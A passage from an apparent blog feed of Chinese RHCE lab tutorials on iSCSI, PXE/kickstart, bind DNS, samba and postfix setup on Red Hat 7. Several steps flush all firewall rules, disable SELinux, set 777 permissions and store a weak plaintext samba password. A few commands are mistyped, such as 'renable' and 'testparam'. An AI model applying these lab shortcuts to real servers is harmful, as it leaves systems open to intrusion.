<li>命令行输入targetcli进行iSCSI部署操作<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imagef8de3494ad4f9a20.png" alt="imagef8de3494ad4f9a20.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image9af18b96fed76baa.png" alt="image9af18b96fed76baa.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image7e8d0072172e9af6.png" alt="image7e8d0072172e9af6.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image51376da58243d471.png" alt="image51376da58243d471.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imagec172eb34c709922d.png" alt="imagec172eb34c709922d.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image6688416831e6421c.png" alt="image6688416831e6421c.png"><h2 id="验证iSCSI网络存储服务"><a href="#验证iSCSI网络存储服务" class="headerlink" title="验证iSCSI网络存储服务"></a>验证iSCSI网络存储服务</h2></li>
<li>linux客户端</li>
</ol>
<ul>
<li>编辑配置文件/etc/iscsi/initiatorname.iscsi<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image312788230cf5cde5.png" alt="image312788230cf5cde5.png"></li>
<li>重启服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart iscsid</span><br><span class="line">systemctl renable iscsid</span><br></pre></td></tr></table></figure></li>
<li>发现服务端<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iscsiadm -m discovery -t st -p 192.168.0.106</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image33a37f20605b4266.png" alt="image33a37f20605b4266.png"></li>
<li>登录到服务端<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iscsiadm -m node -T iqn.2003-01.org.linux-iscsi.dana.x8664:sn.b6176097698c -p 192.168.0.106 -l</span><br></pre></td></tr></table></figure></li>
<li>卸载服务端<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iscsiadm -m node -T iqn.2003-01.org.linux-iscsi.dana.x8664:sn.b6176097698c -u</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>windows客户端<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image5fb28d2aa70f8080.png" alt="image5fb28d2aa70f8080.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image7914279380dd54e0.png" alt="image7914279380dd54e0.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imagea1a638ee565a432e.png" alt="imagea1a638ee565a432e.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image064ff2a8506390fe.png" alt="image064ff2a8506390fe.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image8cdab3925dc9727c.png" alt="image8cdab3925dc9727c.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image7ecfcc15bbc53f7d.png" alt="image7ecfcc15bbc53f7d.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image89a05f5e52f08513.png" alt="image89a05f5e52f08513.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image850319cd5ac9a91f.png" alt="image850319cd5ac9a91f.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image456a82072f09410a.png" alt="image456a82072f09410a.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image7ce4903c5d6965df.png" alt="image7ce4903c5d6965df.png"></li>
</ol>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>iSCSI</tag>
        <tag>网络存储</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7使用PXE+kickstart无人值守安装系统</title>
    <url>//posts/ZH-CN/redhat7-PXE-kickstart-auto-install-system.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redhat配置PXE+kickstart，自动为同网段服务器安装系统。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="PXE-kickstart配置"><a href="#PXE-kickstart配置" class="headerlink" title="PXE+kickstart配置"></a>PXE+kickstart配置</h2><p>IP地址：192.168.0.106<br>网卡配置：仅主机模式</p>
<ol>
<li>配置DHCP服务</li>
</ol>
<ul>
<li>安装dhcp<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install dhcp</span><br></pre></td></tr></table></figure></li>
<li>编辑配置文件/etc/dhcp/dhcpd.conf<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow booting;</span><br><span class="line">allow bootp;</span><br><span class="line">ddns-update-style none;</span><br><span class="line">ignore client-updates;</span><br><span class="line">subnet 192.168.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">option subnet-mask 255.255.255.0;</span><br><span class="line">option domain-name-servers 8.8.8.8;</span><br><span class="line">range dynamic-bootp 192.168.0.50 192.168.0.250; #为客户端自动分配IP地址，地址范围192.168.0.50~192.168.0.250</span><br><span class="line">default-lease-time 21600;</span><br><span class="line">max-lease-time 43200;</span><br><span class="line">next-server 192.168.0.106; #网关设置为本机IP</span><br><span class="line">filename &quot;pxelinux.0&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>重启dhcpd服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart dhcpd</span><br><span class="line">systemctl enable dhcpd</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>配置tftp服务</li>
</ol>
<ul>
<li>安装tfp-server<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install tftp-server</span><br></pre></td></tr></table></figure></li>
<li>修改配置文件/etc/xinetd.d/tftp<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/image.png" alt="image.png"></li>
<li>重启xinetd服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart xinetd</span><br><span class="line">systemctl enable xinetd</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>配置syslinux</li>
</ol>
<ul>
<li>安装syslinux<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install syslinux</span><br></pre></td></tr></table></figure></li>
<li>将syslinux的配置文件拷贝到tftp服务的目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/</span><br><span class="line">cp /media/cdrom/isolinux/&#123;vesamenu.c32,boot.msg&#125; /var/lib/tftpboot/</span><br><span class="line">cp /media/cdrom/images/pxeboot/&#123;vmlinuz,initrd.img&#125; /var/lib/tftpboot/</span><br><span class="line">cd /var/lib/tftpboot</span><br><span class="line">mkdir pxelinux.cfg</span><br><span class="line">cp /media/cdrom/isolinux/isolinux.cfg pxelinux.cfg/default</span><br></pre></td></tr></table></figure></li>
<li>修改配置文件/var/lib/tftpboot/pxelinux.cfg/default<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/image24ccca6e728ebbaa.png" alt="image24ccca6e728ebbaa.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/image30676559fd011adf.png" alt="image30676559fd011adf.png"></li>
</ul>
<ol start="4">
<li>配置http服务</li>
</ol>
<ul>
<li>安装httpd<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install httpd</span><br></pre></td></tr></table></figure></li>
<li>拷贝镜像文件到http根目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf /media/cdrom/* /var/www/html/</span><br></pre></td></tr></table></figure></li>
<li>重启httpd服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li>配置kickstart</li>
</ol>
<ul>
<li>编辑配置文件ks.cfg<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /var/www/html/pub</span><br><span class="line">cp /root/anaconda-ks.cfg /var/www/html/pub</span><br><span class="line">cd /var/www/html/pub</span><br><span class="line">mv anaconda-ks.cfg ks.cfg</span><br><span class="line">chmod 755 ks.cfg</span><br></pre></td></tr></table></figure>
配置文件修改以下内容：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/image82ca57f4a89f4b62.png" alt="image82ca57f4a89f4b62.png"></li>
<li>重启httpd服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li>清除防火墙规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
<h2 id="客户端验证无人值守安装"><a href="#客户端验证无人值守安装" class="headerlink" title="客户端验证无人值守安装"></a>客户端验证无人值守安装</h2>客户端设置：网卡模式为仅主机模式。设置完成后，即可进入自动安装系统，无需手动操作。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/imagec9670f281bf93bd6.png" alt="imagec9670f281bf93bd6.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/image1d0956854cc334e2.png" alt="image1d0956854cc334e2.png"><br>客户端分得的IP地址在DHCP地址池范围内：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/12/imageed657cda8f51f620.png" alt="imageed657cda8f51f620.png"></li>
</ol>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>PXE</tag>
        <tag>kickstart</tag>
        <tag>无人值守安装系统</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7搭建DNS服务-主从DNS服务器同步</title>
    <url>//posts/ZH-CN/redhat7-DNS-master-slave-sync.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建DNS主从服务同步，基于<a href="https://dana5haw.com/posts/rehat7-DNS-bind-chroot">上一篇</a></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="搭建DNS主从服务"><a href="#搭建DNS主从服务" class="headerlink" title="搭建DNS主从服务"></a>搭建DNS主从服务</h2><p>主服务器：192.168.0.106<br>从服务器：192.168.0.102</p>
<ol>
<li>从服务器配置</li>
</ol>
<ul>
<li>安装bind-chroot<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install bind-chroot</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件<code>/etc/named.conf</code><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image0d91dbc7dcdc6728.png" alt="image0d91dbc7dcdc6728.png"><br>改为any：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image.png" alt="image.png"></li>
<li>编辑区域配置文件<code>/etc/named.rfc1912.zones</code>，从主服务器同步DNS正向解析配置文件和反向解析配置文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;linuxprobe.com&quot; IN &#123;</span><br><span class="line">type slave;</span><br><span class="line">file &quot;slaves/linuxprobe.com.zone&quot;; #主从同步成功后，将会在/var/named/slaves目录生成正向解析文件</span><br><span class="line">&#125;; #这部分区域是正向解析</span><br><span class="line">zone &quot;0.168.192.in-addr.arpa&quot; IN &#123;</span><br><span class="line">type slave;</span><br><span class="line">file &quot;slaves/192.168.0.arpa&quot;; #主从同步成功后，将会在/var/named/slaves目录生成反向解析文件</span><br><span class="line">&#125;; #这部分区域是反向解析</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>主服务器配置</li>
</ol>
<ul>
<li>修改区域配置文件<code>/etc/named.rfc1912.zones</code>，允许从服务器同步DNS正向解析配置文件和反向解析配置文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;linuxprobe.com&quot; IN &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;linuxprobe.com.zone&quot;;</span><br><span class="line">allow-update &#123; 192.168.0.102; &#125;; #这是从服务器的IP地址</span><br><span class="line">&#125;; #这部分区域是正向解析</span><br><span class="line">zone &quot;0.168.192.in-addr.arpa&quot; IN &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;192.168.0.arpa&quot;;</span><br><span class="line">allow-update &#123; 192.168.0.102; &#125;; #这是从服务器的IP地址</span><br><span class="line">&#125;; #这部分区域是反向解析</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>测试DNS主从服务</li>
</ol>
<ul>
<li>主服务器清空iptables规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
<li>主服务器重启DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart named</span><br></pre></td></tr></table></figure></li>
<li>从服务器设置DNS服务器为本机192.168.0.102<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmtui #进入图形化界面配置网卡信息，修改DNS服务器为本机IP地址</span><br><span class="line">systemctl restart network #重启网卡使DNS服务配置生效</span><br></pre></td></tr></table></figure></li>
<li>从服务器启动DNS服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start named</span><br><span class="line">systemctl enable named</span><br></pre></td></tr></table></figure></li>
<li>检查从服务器是否成功同步主服务器的正向解析文件和反向解析文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls  /var/named/slaves</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image9d5229b33cfee0af.png" alt="image9d5229b33cfee0af.png"><div class="note [class]">
            <p>注意：从主服务器同步的正向解析文件和反向解析文件，在从服务器上看到是乱码。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image0158f96fd8b78464.png" alt="image0158f96fd8b78464.png"></p>
          </div></li>
<li>检查从服务器是否能够成功使用主服务器的DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.linuxprobe.com #测试域名解析结果，解析的IP是192.168.0.106说明DNS正向解析生效</span><br><span class="line">host 192.168.0.106 #测试反向解析结果，解析的域名是www.linuxprobe.com说明DNS反向解析生效</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>DNS服务</tag>
        <tag>主从DNS服务同步</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7搭建samba服务-linux与linux主机共享</title>
    <url>//posts/ZH-CN/redhat7-build-samba-server-linux-to-linux.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>利用cifs加密协议，samba服务实现linux和linux之间的文件共享。服务端和客户端都需要安装cifs-utils软件。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="设置cifs实现目录共享"><a href="#设置cifs实现目录共享" class="headerlink" title="设置cifs实现目录共享"></a>设置cifs实现目录共享</h2><p>环境：samba服务端已搭建好。</p>
<ol>
<li>服务端和客户端安装cifs-utils：切记，在机器重启之后，必须重新挂载yum仓库，否则yu无法正常使用！并且服务端一定要清除防火墙规则：<code>iptables -F</code>、<code>service iptables save</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install cifs-utils</span><br></pre></td></tr></table></figure></li>
<li>客户端创建共享目录挂载点<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /xkj</span><br><span class="line">chmod -Rf 777 /xkj</span><br></pre></td></tr></table></figure></li>
<li>客户端设置samba密码文件，用于连接服务端samba服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">vi auth.smb</span><br></pre></td></tr></table></figure>

</li>
</ol>
<details><summary>点击展开配置文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=sambaxkj</span><br><span class="line">password=redhat</span><br><span class="line">domain=WORKGROUP #samba服务端设置的工作组名称</span><br></pre></td></tr></table></figure>

</p>
</details>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 auth.smb #权限设置为只允许自己读写</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>客户端设置挂载信息，将服务端的共享目录挂载到本地<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/fstab</span><br></pre></td></tr></table></figure>
新增这个挂载信息：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//192.168.0.106/sambaxkj /xkj cifs credentials=/root/auth.smb 0 0</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>解析：linux系统中，<code>//</code>用于访问samba服务；windows系统中，<code>\\</code>用于访问samba服务。<br><code>credentials</code>指的是挂载到samba服务端的凭据。</p>
          </div>
挂载即可生效：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -a</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>samba服务</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7搭建DNS服务-正向解析、反向解析</title>
    <url>//posts/ZH-CN/rehat7-DNS-bind-chroot.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建DNS服务，实现正向解析和反向解析。正向解析：将域名解析为IP。反向解析：将IP解析为域名。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="搭建DNS服务"><a href="#搭建DNS服务" class="headerlink" title="搭建DNS服务"></a>搭建DNS服务</h2><ol>
<li>安装bind-chroot<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install bind-chroot</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件<code>/etc/named.conf</code><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image0d91dbc7dcdc6728.png" alt="image0d91dbc7dcdc6728.png"><br>改为any：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image.png" alt="image.png"></li>
<li>编辑区域配置文件<code>/etc/named.rfc1912.zones</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;linuxprobe.com&quot; IN &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;linuxprobe.com.zone&quot;;</span><br><span class="line">allow-update &#123; none; &#125;;</span><br><span class="line">&#125;; #这部分区域是正向解析</span><br><span class="line">zone &quot;0.168.192.in-addr.arpa&quot; IN &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;192.168.0.arpa&quot;;</span><br><span class="line">allow-update &#123; none; &#125;;</span><br><span class="line">&#125;; #这部分区域是反向解析</span><br></pre></td></tr></table></figure></li>
<li>正向解析实验</li>
</ol>
<ul>
<li>将正向解析模板配置文件<code>/var/named/named.localhost</code>复制到<code>/var/named/linuxprobe.com.zone</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -a /var/named/named.localhost /var/named/linuxprobe.com.zone</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>注意：这里的cp命令带上了<code>-a</code>参数，指的是拷贝模板文件的所有属性，包括 所属主、所属组。</p>
          </div>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image1bd5c450d28cdc83.png" alt="image1bd5c450d28cdc83.png"></li>
<li>编辑正向解析配置文件<code>/var/named/linuxprobe.com.zone</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$TTL 1D</span><br><span class="line">@       IN SOA  linuxprobe.com. root.linuxprobe.com (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      ns.linuxprobe.com.</span><br><span class="line">ns      IN A    192.168.0.106</span><br><span class="line">www     IN A    192.168.0.106</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>解析：第二行<code>linuxprobe.com.</code>指的是DNS的区域，必须写域名的完整格式（最后一个<code>.</code>号不能漏写）。<code>root.linuxprobe.com</code>指的是域名管理员的邮箱。</p>
          </div></li>
<li>启动DNS服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start named</span><br><span class="line">systemctl enable named</span><br></pre></td></tr></table></figure></li>
<li>测试DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmtui #进入图形化配置界面设置网卡信息，将DNS服务器设置为本机IP地址192.168.0.106</span><br><span class="line">systemctl restart network #重启网卡</span><br><span class="line">ping www.linuxprobe.com #测试域名解析结果，解析的IP是192.168.0.106说明DNS正向解析生效</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li>反向解析实验</li>
</ol>
<ul>
<li>将反向解析模板配置文件<code>/var/named/named.loopback</code>复制到<code>/var/named/192.168.0.arpa</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -a /var/named/named.loopback /var/named/192.168.0.arpa</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>注意：这里的cp命令带上了<code>-a</code>参数，指的是拷贝模板文件的所有属性，包括 所属主、所属组。</p>
          </div>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image1bd5c450d28cdc83.png" alt="image1bd5c450d28cdc83.png"></li>
<li>编辑反向解析配置文件<code>/var/named/192.168.0.arpa</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$TTL 1D</span><br><span class="line">@       IN SOA  linuxprobe.com. root.linuxprobe.com (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      ns.linuxprobe.com.</span><br><span class="line">ns      IN A    192.168.0.106</span><br><span class="line">106     PTR     www.linuxprobe.com</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>解析：第二行<code>linuxprobe.com.</code>指的是DNS的区域，必须写域名的完整格式（最后一个<code>.</code>号不能漏写）。<code>root.linuxprobe.com</code>指的是域名管理员的邮箱。<br>PTR是指针记录，仅用于反向解析 </p>
          </div></li>
<li>重启DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart named</span><br></pre></td></tr></table></figure></li>
<li>测试DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host 192.168.0.106 #测试反向解析结果，解析的域名是www.linuxprobe.com说明DNS反向解析生效</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>DNS服务</tag>
        <tag>正向解析</tag>
        <tag>反向解析</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7搭建samba服务-linux与windows主机共享</title>
    <url>//posts/ZH-CN/redhat7-build-samba-server.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redhat7搭建samba服务，实现linux和windows之间的文件共享。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="搭建samba服务"><a href="#搭建samba服务" class="headerlink" title="搭建samba服务"></a>搭建samba服务</h2><ol>
<li>安装samba<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y samba</span><br></pre></td></tr></table></figure></li>
<li>配置文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>

</li>
</ol>
<details><summary>点击展开配置文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">	workgroup = MYGROUP</span><br><span class="line">	server string = MicroSoft Server 2003</span><br><span class="line">	log file = /var/log/samba/log.%m</span><br><span class="line">	max log size = 50</span><br><span class="line">	security = user</span><br><span class="line">	passdb backend = tdbsam</span><br><span class="line">[sambaxkj]</span><br><span class="line">comment = do not delete it!</span><br><span class="line">path = /sambaxkj</span><br><span class="line">public = no</span><br><span class="line">writable = yes</span><br></pre></td></tr></table></figure>

</p>
</details>

<div class="note [class]">
            <p>注意：testparam命令可以检查配置文件语法是否正确。</p>
          </div>

<ol start="3">
<li><p>创建共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /sambaxkj</span><br><span class="line">chmod -Rf 777 /sambaxkj</span><br></pre></td></tr></table></figure>
</li>
<li><p>清空防火墙规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
<li><p>重启samba服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart smb</span><br></pre></td></tr></table></figure>

</li>
</ol>
<div class="note [class]">
            <p>注意：重启失败，因为没有关闭selinux。关闭selinux之后即可正常启动samba服务。<br>临时关闭selinux；<code>setenforce 0</code></p>
          </div>

<ol start="6">
<li>创建samba用户<br>本地用户无法连接samba共享目录，必须 创建专用的samba用户，用于共享目录。</li>
</ol>
<ul>
<li>新增samba用户 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd sambaxkj</span><br></pre></td></tr></table></figure></li>
<li>设置samba用户的密码 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pdbedit -a -u sambaxkj</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="测试文件共享服务"><a href="#测试文件共享服务" class="headerlink" title="测试文件共享服务"></a>测试文件共享服务</h2><p>在windows主机进入“运行”，输入<code>\\192.168.0.106</code>，（IP地址为linux虚拟机的IP地址），即可使用samba用户登录到linux主机的共享目录。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/02/image3737797bcaf9fc47.png" alt="image3737797bcaf9fc47.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/02/imagebad2fbf34f95b501.png" alt="imagebad2fbf34f95b501.png"><br>可实现linux主机和windows主机的目录共享，任意一方都可增删改共享目录里面的内容。</p>
<hr>
<p>打开selinux之后（setenforce 1），无法进入共享目录。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/02/image3b2eafe2f3714179.png" alt="image3b2eafe2f3714179.png"><br>这是什么原因导致的？<br>是selinux上下文的限制还是域的限制？<br>答案：是上下文的限制。</p>
<ul>
<li>查看与samba服务相关的sebool设置：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getsebool -a |grep samba</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/02/image45dd94e9b113c328.png" alt="image45dd94e9b113c328.png"></li>
<li>打开samba_export_all_rw上下文，允许samba用户对共享目录可读可写<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setsebool -P samba_export_all_rw=on</span><br></pre></td></tr></table></figure></li>
<li>重启samba服务，现在samba用户就可以对共享目录做读写操作了<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart smb</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>samba服务</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7搭建邮局postfix+dovecot+outlook</title>
    <url>//posts/ZH-CN/redhat7-postfix-dovecot-outlook.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redhat7搭建邮局：postfix+dovecot+outlook。使用outlook作为收发客户端，postfix作为发件端、dovecot作为收件端。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="搭建邮局"><a href="#搭建邮局" class="headerlink" title="搭建邮局"></a>搭建邮局</h2><ol>
<li>部署DNS正向解析</li>
</ol>
<ul>
<li>安装bind-chroot<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install bind-chroot</span><br></pre></td></tr></table></figure></li>
<li>编辑配置文件/etc/named.conf<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image7ced7106b31c31a9.png" alt="image7ced7106b31c31a9.png"></li>
<li>编辑区域配置文件/etc/named.rfc1912.zones<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;linuxcool.com&quot; IN &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;linuxcool.com.zone&quot;;</span><br><span class="line">allow-update &#123; none; &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>拷贝正向解析文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/named/</span><br><span class="line">cp -a named.localhost linuxcool.com.zone</span><br></pre></td></tr></table></figure></li>
<li>编辑正向解析文件linuxcool.com.zone<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$TTL 1D</span><br><span class="line">@       IN SOA  linuxcool.com. root.linuxcool.com. (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      ns.linuxcool.com.</span><br><span class="line">ns      IN A    192.168.0.106</span><br><span class="line">mail    IN A    192.168.0.106</span><br><span class="line">@       IN MX 10 mail.linuxcool.com.</span><br></pre></td></tr></table></figure></li>
<li>重启DNS服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart named</span><br><span class="line">systemctl enable named</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>设置主机名（永久修改）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname mail.linuxcool.com</span><br></pre></td></tr></table></figure></li>
<li>配置postfix发件服务</li>
</ol>
<ul>
